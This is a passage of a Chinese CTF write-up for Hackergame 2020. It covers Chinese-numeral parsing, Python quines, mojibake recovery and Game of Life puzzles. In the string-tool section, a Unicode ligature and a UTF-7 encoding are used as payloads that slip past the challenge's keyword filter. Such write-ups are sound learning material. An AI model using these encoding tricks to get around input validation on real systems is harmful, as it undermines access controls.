class="token string">'九'</span><span class="token punctuation">:</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token string">'零'</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span>
    <span class="token string">'壹'</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'贰'</span><span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">'叁'</span><span class="token punctuation">:</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token string">'肆'</span><span class="token punctuation">:</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">'伍'</span><span class="token punctuation">:</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token string">'陆'</span><span class="token punctuation">:</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token string">'柒'</span><span class="token punctuation">:</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token string">'捌'</span><span class="token punctuation">:</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'玖'</span><span class="token punctuation">:</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token string">'貮'</span><span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">'两'</span><span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">,</span>
<span class="token punctuation">}</span>

CN_UNIT <span class="token operator">=</span> <span class="token punctuation">{</span>
    <span class="token string">'十'</span><span class="token punctuation">:</span> <span class="token number">10</span><span class="token punctuation">,</span>
    <span class="token string">'拾'</span><span class="token punctuation">:</span> <span class="token number">10</span><span class="token punctuation">,</span>
    <span class="token string">'百'</span><span class="token punctuation">:</span> <span class="token number">100</span><span class="token punctuation">,</span>
    <span class="token string">'佰'</span><span class="token punctuation">:</span> <span class="token number">100</span><span class="token punctuation">,</span>
    <span class="token string">'千'</span><span class="token punctuation">:</span> <span class="token number">1000</span><span class="token punctuation">,</span>
    <span class="token string">'仟'</span><span class="token punctuation">:</span> <span class="token number">1000</span><span class="token punctuation">,</span>
    <span class="token string">'万'</span><span class="token punctuation">:</span> <span class="token number">10000</span><span class="token punctuation">,</span>
    <span class="token string">'萬'</span><span class="token punctuation">:</span> <span class="token number">10000</span><span class="token punctuation">,</span>
    <span class="token string">'亿'</span><span class="token punctuation">:</span> <span class="token number">100000000</span><span class="token punctuation">,</span>
    <span class="token string">'億'</span><span class="token punctuation">:</span> <span class="token number">100000000</span><span class="token punctuation">,</span>
    <span class="token string">'兆'</span><span class="token punctuation">:</span> <span class="token number">1000000000000</span><span class="token punctuation">,</span>
<span class="token punctuation">}</span>


<span class="token keyword">def</span> <span class="token function">chinese_to_arabic</span><span class="token punctuation">(</span>cn<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token builtin">int</span><span class="token punctuation">:</span>
    unit <span class="token operator">=</span> <span class="token number">0</span>   <span class="token comment"># current</span>
    ldig <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>  <span class="token comment"># digest</span>
    <span class="token keyword">for</span> cndig <span class="token keyword">in</span> <span class="token builtin">reversed</span><span class="token punctuation">(</span>cn<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> cndig <span class="token keyword">in</span> CN_UNIT<span class="token punctuation">:</span>
            unit <span class="token operator">=</span> CN_UNIT<span class="token punctuation">.</span>get<span class="token punctuation">(</span>cndig<span class="token punctuation">)</span>
            <span class="token keyword">if</span> unit <span class="token operator">==</span> <span class="token number">10000</span> <span class="token keyword">or</span> unit <span class="token operator">==</span> <span class="token number">100000000</span><span class="token punctuation">:</span>
                ldig<span class="token punctuation">.</span>append<span class="token punctuation">(</span>unit<span class="token punctuation">)</span>
                unit <span class="token operator">=</span> <span class="token number">1</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            dig <span class="token operator">=</span> CN_NUM<span class="token punctuation">.</span>get<span class="token punctuation">(</span>cndig<span class="token punctuation">)</span>
            <span class="token keyword">if</span> unit<span class="token punctuation">:</span>
                dig <span class="token operator">*=</span> unit
                unit <span class="token operator">=</span> <span class="token number">0</span>
            ldig<span class="token punctuation">.</span>append<span class="token punctuation">(</span>dig<span class="token punctuation">)</span>
    <span class="token keyword">if</span> unit <span class="token operator">==</span> <span class="token number">10</span><span class="token punctuation">:</span>
        ldig<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span>
    val<span class="token punctuation">,</span> tmp <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span>
    <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">reversed</span><span class="token punctuation">(</span>ldig<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> x <span class="token operator">==</span> <span class="token number">10000</span> <span class="token keyword">or</span> x <span class="token operator">==</span> <span class="token number">100000000</span><span class="token punctuation">:</span>
            val <span class="token operator">+=</span> tmp <span class="token operator">*</span> x
            tmp <span class="token operator">=</span> <span class="token number">0</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            tmp <span class="token operator">+=</span> x
    val <span class="token operator">+=</span> tmp
    <span class="token keyword">return</span> val

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    s <span class="token operator">=</span> <span class="token triple-quoted-string string">"""贰拾元陆角伍分	1
    壹元壹角贰分	4
    拾捌元伍角壹分	1
    ...
    """</span>
    l <span class="token operator">=</span> s<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span>
    <span class="token comment"># print(len(l))</span>

    re_split <span class="token operator">=</span> re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">r'(.*元)?(.*角)?(.*分)?'</span><span class="token punctuation">)</span>

    total_yuan <span class="token operator">=</span> <span class="token number">0</span>
    total_jiao <span class="token operator">=</span> <span class="token number">0</span>
    total_fen <span class="token operator">=</span> <span class="token number">0</span>

    <span class="token keyword">for</span> row <span class="token keyword">in</span> l<span class="token punctuation">:</span>
        yuan_int <span class="token operator">=</span> <span class="token number">0</span>
        jiao_int <span class="token operator">=</span> <span class="token number">0</span>
        fen_int <span class="token operator">=</span> <span class="token number">0</span>

        <span class="token keyword">print</span><span class="token punctuation">(</span>row<span class="token punctuation">)</span>
        money <span class="token operator">=</span> row<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'\t'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
        count <span class="token operator">=</span> row<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'\t'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
        count_int <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>count<span class="token punctuation">)</span>

        money_group <span class="token operator">=</span> re_split<span class="token punctuation">.</span>search<span class="token punctuation">(</span>money<span class="token punctuation">)</span>
        <span class="token keyword">if</span> money_group<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            yuan <span class="token operator">=</span> money_group<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>
            yuan_int <span class="token operator">=</span> chinese_to_arabic<span class="token punctuation">(</span>yuan<span class="token punctuation">)</span>

        <span class="token keyword">if</span> money_group<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            jiao <span class="token operator">=</span> money_group<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>
            jiao_int <span class="token operator">=</span> chinese_to_arabic<span class="token punctuation">(</span>jiao<span class="token punctuation">)</span>

        <span class="token keyword">if</span> money_group<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            fen <span class="token operator">=</span> money_group<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>
            fen_int <span class="token operator">=</span> chinese_to_arabic<span class="token punctuation">(</span>fen<span class="token punctuation">)</span>

        <span class="token keyword">print</span><span class="token punctuation">(</span>yuan_int<span class="token punctuation">,</span> jiao_int<span class="token punctuation">,</span> fen_int<span class="token punctuation">)</span>

        total_yuan <span class="token operator">+=</span> yuan_int <span class="token operator">*</span> count_int
        total_jiao <span class="token operator">+=</span> jiao_int <span class="token operator">*</span> count_int
        total_fen <span class="token operator">+=</span> fen_int <span class="token operator">*</span> count_int

    total <span class="token operator">=</span> total_yuan <span class="token operator">+</span> total_jiao <span class="token operator">*</span> <span class="token number">0.1</span> <span class="token operator">+</span> total_fen <span class="token operator">*</span> <span class="token number">0.01</span>

    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"total:"</span><span class="token punctuation">,</span> total<span class="token punctuation">)</span></code></pre>
<p><img src="/2020/11/08/CTF_2020Hackergame/image-20201031162456877.png" alt="results"></p>
<p>所以就是 </p>
<p><code>flag{20132.81}</code></p>
<blockquote>
<p>后面才知道，这题居然是动态 flag，也就是说动态生成的文件。出题师傅们太强了！</p>
<p>BTW，还发现了一个好用的库 **<a target="_blank" rel="noopener" href="https://github.com/Ailln/cn2an">cn2an</a>**。</p>
<blockquote>
<p>📦 快速转化「中文数字」和「阿拉伯数字」～ (最新特性：分数，日期、温度等转化）    </p>
</blockquote>
</blockquote>
<hr>
<h2 id="自复读的复读机"><a href="#自复读的复读机" class="headerlink" title="自复读的复读机"></a>自复读的复读机</h2><blockquote>
<p>你现在需要编写两个只有一行 Python 代码的顶尖复读机：</p>
<ul>
<li>其中一个要输出代码本身的逆序（即所有字符从后向前依次输出）</li>
<li>另一个是输出代码本身的 sha256 哈希值，十六进制小写</li>
</ul>
<p>满足两个条件分别对应了两个 flag。</p>
</blockquote>
<p>参考：</p>
<p><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Quine_(computing)">Wikipedia: Quine (computing)</a></p>
<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/125114823">B乎：如何编写一个打印自身源代码的程序</a></p>
<blockquote>
<p>在Python中有一个 <code>%r</code>，它的意思就是调用对象的 <code>repr()</code> 方法后替换本身在字符串中的位置，对于字符串对象，会保留其本身的引号（这点在我们实现 Quine 的时候会减少很多麻烦）。</p>
</blockquote>
<h3 id="输出代码本身的逆序"><a href="#输出代码本身的逆序" class="headerlink" title="输出代码本身的逆序"></a>输出代码本身的逆序</h3><pre class="language-python" data-language="python"><code class="language-python">s <span class="token operator">=</span> <span class="token string">"s = %r;print(''.join(reversed(s %% s)),end='')"</span><span class="token punctuation">;</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token builtin">reversed</span><span class="token punctuation">(</span>s <span class="token operator">%</span> s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span></code></pre>
<p><img src="/2020/11/08/CTF_2020Hackergame/image-20201102182322408.png" alt="flag"></p>
<p>BTW，这个题本来想在 VPS 上搭个接口直接返回的逆向的字符串，不过发现这个机器好像不通外网于是不行？</p>
<p>BTW，这个<code>exec()</code>可以直接读源码但不能读 flag，2333. 原因是用了 subprocess 以 nobody 用户去执行脚本，而 flag 放在了 /root 目录下。</p>
<h3 id="输出代码本身的-sha256-哈希值"><a href="#输出代码本身的-sha256-哈希值" class="headerlink" title="输出代码本身的 sha256 哈希值"></a>输出代码本身的 sha256 哈希值</h3><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> hashlib<span class="token punctuation">;</span>m<span class="token operator">=</span>hashlib<span class="token punctuation">.</span>sha256<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>s<span class="token operator">=</span><span class="token string">"import hashlib;m=hashlib.sha256();s=%r;m.update((s %% s).encode());print(m.hexdigest(),end='')"</span><span class="token punctuation">;</span>m<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token punctuation">(</span>s <span class="token operator">%</span> s<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">print</span><span class="token punctuation">(</span>m<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span></code></pre>
<p><img src="/2020/11/08/CTF_2020Hackergame/image-20201102182511614.png" alt="flag"></p>
<hr>
<h2 id="233-同学的字符串工具"><a href="#233-同学的字符串工具" class="headerlink" title="233 同学的字符串工具"></a>233 同学的字符串工具</h2><p>题目所给关键代码如下。</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">to_upper</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>
    r <span class="token operator">=</span> re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">'[fF][lL][aA][gG]'</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> r<span class="token punctuation">.</span>match<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'how dare you'</span><span class="token punctuation">)</span>
    <span class="token keyword">elif</span> s<span class="token punctuation">.</span>upper<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">'FLAG'</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'yes, I will give you the flag'</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'/flag1'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'%s'</span> <span class="token operator">%</span> s<span class="token punctuation">.</span>upper<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">to_utf8</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>
    r <span class="token operator">=</span> re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">'[fF][lL][aA][gG]'</span><span class="token punctuation">)</span>
    s <span class="token operator">=</span> s<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment"># make it bytes</span>
    <span class="token keyword">if</span> r<span class="token punctuation">.</span>match<span class="token punctuation">(</span>s<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'how dare you'</span><span class="token punctuation">)</span>
    <span class="token keyword">elif</span> s<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-7'</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">'flag'</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'yes, I will give you the flag'</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'/flag2'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'%s'</span> <span class="token operator">%</span> s<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-7'</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>


<h3 id="字符串大写工具"><a href="#字符串大写工具" class="headerlink" title="字符串大写工具"></a><strong><strong>字符串大写工具</strong></strong></h3><p>得看看啥字符经过 <code>upper</code> 方法出来就是 <code>flag</code> 或者其中某个字符。</p>
<p>这里就硬是跑出来的。</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">,</span> <span class="token number">0x10000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    char <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token string">'f'</span> <span class="token keyword">in</span> char<span class="token punctuation">.</span>upper<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token string">'F'</span> <span class="token keyword">in</span> char<span class="token punctuation">.</span>upper<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'ﬂ'</span><span class="token punctuation">.</span>upper<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span><span class="token string">'ﬂ'</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>
<p><img src="/2020/11/08/CTF_2020Hackergame/image-20201103155334679.png" alt="求解字符"></p>
<p><strong>payload:</strong></p>
<p><code>ﬂag</code></p>
<p><img src="/2020/11/08/CTF_2020Hackergame/image-20201103014034671.png" alt="flag1"></p>
<p><code>flag{badunic0debadbad_xxxxxxxx}</code></p>
<p>Unicode 太奇妙了！据说这叫做 <strong>unicode 字符折叠/合字</strong>（？）</p>
<blockquote>
<p>Extensive Reading:</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/csdnnews/article/details/103516231">CSDN: 了不起的 Unicode！</a></p>
</blockquote>
<h3 id="UTF-7-到-UTF-8-转换工具"><a href="#UTF-7-到-UTF-8-转换工具" class="headerlink" title="UTF-7 到 UTF-8 转换工具"></a>UTF-7 到 UTF-8 转换工具</h3><p><code>s.encode()</code>和 <code>decode()</code> 默认用的 utf-8 编码，这里用 utf-7 编码再用 utf-7 解码就能吐 flag 了。</p>
<p>最开始用 Python 的 <code>'flag'.encode('utf-7')</code> 方法，发现出来结果就是 <code>b'flag'</code>，傻了。</p>
<p>之后去查了 <a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/UTF-7">UTF-7 的维基百科</a>，决定自己按照编码流程走一遍吧。</p>
<p>（没注意是 <strong>UTF-16 大端序</strong>，我试了半天发现最后是大小端的问题，人傻了。</p>
<p><img src="/2020/11/08/CTF_2020Hackergame/image-20201103011526169.png" alt="编码方法"></p>
<p>首先将 <code>flag</code> 转换为 UTF-16(BE) (1201)，即下面的 <code>x</code>。</p>
<p>而后每六位一组进行 base64 编码，这里直接用 base64 模块的方法了。</p>
<p>最后去掉末尾的 <code>=</code>，在最前面加上 <code>+</code>，即可得到 UTF-7 编码。</p>
<pre class="language-python" data-language="python"><code class="language-python">x <span class="token operator">=</span> <span class="token string">b'\x00\x66\x00\x6c\x00\x61\x00\x67'</span>
y <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
<span class="token comment"># b'AGYAbABhAGc='</span>

<span class="token string">b'+AGYAbABhAGc='</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-7'</span><span class="token punctuation">)</span>
<span class="token comment"># 'flag'</span></code></pre>
<p><strong>payload:</strong></p>
<p><code>+AGYAbABhAGc</code></p>
<p><img src="/2020/11/08/CTF_2020Hackergame/image-20201103010408030.png" alt="flag2"></p>
<p><code>flag{please_visit_www.utf8everywhere.org_25xxxxxx}</code></p>
<p><a target="_blank" rel="noopener" href="https://utf8everywhere.org/">https://utf8everywhere.org/</a>  啊 UTF-8 编码确实是个好东西。</p>
<p><img src="/2020/11/08/CTF_2020Hackergame/image-20201103011937989.png" alt="facts"></p>
<p><em>草，想想就气（</em></p>
<hr>
<h2 id="从零开始的火星文生活"><a href="#从零开始的火星文生活" class="headerlink" title="从零开始的火星文生活"></a>从零开始的火星文生活</h2><blockquote>
<p>L 同学打开附件一看，傻眼了，全都是意义不明的汉字。机智的 L 同学想到 Q 同学平时喜欢使用 <strong>GBK 编码</strong>，也许是打开方式不对。结果用 GBK 打开却看到了一堆夹杂着日语和数字的<strong>火星文</strong>……</p>
<p>L 同学彻底懵逼了，几经周折，TA 找到了科大最负盛名的火星文专家 (你)。依靠多年的字符编码解码的经验，你可以破译 Q 同学发来的火星文是什么意思吗？</p>
<p>注：正确的 flag 全部由 <strong>ASCII</strong> 字符组成！</p>
</blockquote>
<p>有大佬发现了一个<strong>编解码网站</strong>：<a target="_blank" rel="noopener" href="http://www.mytju.com/classcode/tools/messyCodeRecover.asp">http://www.mytju.com/classcode/tools/messyCodeRecover.asp</a></p>
<p>能够猜测原来和可能的编解码方式。</p>
<p><em>（BTW, 这个网站不是本地跑的，请注意信息安全</em></p>
<p>根据提示，应该是先用 GBK 来解码，GBK =&gt; UTF-8，然而结果像这样：</p>
<p><img src="/2020/11/08/CTF_2020Hackergame/image-20201104231901155.png" alt="GBK => UTF-8"></p>
<p>发现不对劲，应该反过来，是 UTF-8 =&gt; GBK。</p>
<p><img src="/2020/11/08/CTF_2020Hackergame/image-20201104232120053.png" alt="UTF-8 => GBK"></p>
<p>然后再把拿去恢复。</p>
<p>发现是要用 GBK 来读，再转换到 iso-8859-1，即 Latin1（28591）。</p>
<p><img src="/2020/11/08/CTF_2020Hackergame/image-20201104231650349.png" alt="flag"></p>
<p>要不然就 python 写脚本。（贼想不通这里，佛了</p>
<p><strong>str == encode ==&gt; bytes == decode ==&gt; str</strong></p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'gibberish_message.txt'</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> fin<span class="token punctuation">:</span>
    content <span class="token operator">=</span> fin<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span>
content1 <span class="token operator">=</span> content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">,</span> errors<span class="token operator">=</span><span class="token string">'ignore'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'gbk'</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>content1<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
content2 <span class="token operator">=</span> content1<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">,</span> errors<span class="token operator">=</span><span class="token string">'ignore'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'latin1'</span><span class="token punctuation">,</span> errors<span class="token operator">=</span><span class="token string">'ignore'</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>content2<span class="token punctuation">)</span>
content3 <span class="token operator">=</span> content2<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'gbk'</span><span class="token punctuation">,</span> errors<span class="token operator">=</span><span class="token string">'ignore'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">,</span> errors<span class="token operator">=</span><span class="token string">'ignore'</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>content3<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>
<p><img src="/2020/11/08/CTF_2020Hackergame/image-20201104233010095.png" alt="python decode"></p>
<p>当然也可以在 Linux 下借助 <code>iconv</code></p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">cat</span> gibberish_message.txt  <span class="token operator">|</span> <span class="token function">iconv</span> -f utf8 -t gbk <span class="token operator">|</span> <span class="token function">iconv</span> -f utf8 -t latin1 <span class="token operator">|</span> <span class="token function">iconv</span> -f gbk -t utf8 <span class="token operator">&gt;</span> <span class="token number">1</span>.txt
<span class="token comment"># OR (utf-8 for default)</span>
<span class="token comment"># cat gibberish_message.txt  | iconv -t gbk | iconv -t latin1 | iconv -f gbk</span></code></pre>
<p>得到文件内容</p>
<pre class="language-none"><code class="language-none">我攻破了 Ｈａｃｋｅｒｇａｍｅ 的服务器，偷到了它们的 ｆｌａｇ，现在我把 ｆｌａｇ 发给你：
ｆｌａｇ｛Ｈ４ｖ３＿ＦｕＮ＿ｗ１Ｔｈ＿３ｎｃ０ｄ１ｎｇ＿４Ｎｄ＿ｄ３ｃ０Ｄ１ｎＧ＿xxxxxx｝
快去比赛平台提交吧！
不要再把这份信息转发给其他人了，要是被发现就糟糕了！</code></pre>
<p><code>flag{H4v3_FuN_w1Th_3nc0d1ng_4Nd_d3c0D1nG_xxxxxx}</code></p>
<hr>
<h2 id="超简单的世界模拟器"><a href="#超简单的世界模拟器" class="headerlink" title="超简单的世界模拟器"></a>超简单的世界模拟器</h2><p>参考：</p>
<p><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Conway's_Game_of_Life">wikipedia: Conway’s Game of Life</a></p>
<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/261431820">学术干货 | Conway’s Game of Life 生命游戏的建筑设计应用</a></p>
<p>这里有个<strong>模拟器</strong>：<a target="_blank" rel="noopener" href="https://nealwang.net/JustForFun/GameOfLife.html">https://nealwang.net/JustForFun/GameOfLife.html</a></p>
<p>也挺有意思的。</p>
<p>两个正方形的第一行分别位于第6行，第26行。</p>
<h3 id="蝴蝶效应"><a href="#蝴蝶效应" class="headerlink" title="蝴蝶效应"></a>蝴蝶效应</h3><p>消除第一个正方形：</p>
<p>下面 LWSS 这个图形能水平向右移动。</p>
<p><img src="/2020/11/08/CTF_2020Hackergame/image-20201103154425315.png"></p>
<p>而 Glinder 这个图形能向右下角45°方向移动。</p>
<p><img src="/2020/11/08/CTF_2020Hackergame/image-20201103154500247.png" alt="image-20201103154500247"></p>
<pre class="language-none"><code class="language-none">000000000000000
000000000000000
000000000000000
000000000000000
000000000000000
100100000000000
000010000000000
100010000000000
011110000000000
000000000000000
000000000000000
000000000000000
000000000000000
000000000000000
000000000000000
# Or
000000000000000
100100000000000
000010000000000
100010000000000
011110000000000
000000000000000
000000000000000
000000000000000
000000000000000
000000000000000
000000000000000
000000000000000
000000000000000
000000000000000
000000000000000</code></pre>
<p><img src="/2020/11/08/CTF_2020Hackergame/image-20201101172719778.png" alt="flag"></p>
<p>测试中发现这些能清除下面的正方形（（</p>
<pre class="language-none"><code class="language-none">000000000000000
000000000000000
000000000000000
000000000010000
000000000001000
100100000111000
000010000000000
100010000000000
011110000000000
000000000000000
000000000000000
000000000000000
000000000000000
000000000000000
000000000000000
# OR
000000000000000
000000000000100
000000000000010
000000000001110
000000000000000
100100000000000
000010000000000
100010000000000
011110000000000
000000000000000
000000000000000
000000000000000
000000000000000
000000000000000
000000000000000</code></pre>
<h3 id="一石二鸟"><a href="#一石二鸟" class="headerlink" title="一石二鸟"></a>一石二鸟</h3><p>需要同时消除两个正方形。</p>
<p>试了好久没出来，最后还是瞎改出来的233。</p>
<p>发现下面这个图形能向外扩散，于是试试。</p>
<p><img src="/2020/11/08/CTF_2020Hackergame/image-20201103154324961.png"></p>
<pre class="language-none"><code class="language-none">000000000000000
000000000000000
000000000000000
000000000000000
000000000000000
000000000010010
000000000000001
000000000010001
000000000001111
000000000000000
000000000000000
001100000000000
000100000000000
011100000000000
000000000000000</code></pre>
<p><img src="/2020/11/08/CTF_2020Hackergame/image-20201103154207576.png" alt="flag2"></p>
<hr>
<h2 id="233-同学的-Docker"><a href="#233-同学的-Docker" class="headerlink" title="233 同学的 Docker"></a>233 同学的 Docker</h2><blockquote>
<p>233 同学在软工课上学到了 Docker 这种方便的东西，于是给自己的字符串工具项目写了一个 Dockerfile。</p>
<p>但是 233 同学突然发现它不小心把一个私密文件（<code>flag.txt</code>）打包进去了，于是写了一行命令删掉这个文件。</p>
<p>「既然已经删掉了，应该不会被人找出来吧？」233 想道。</p>
<ul>
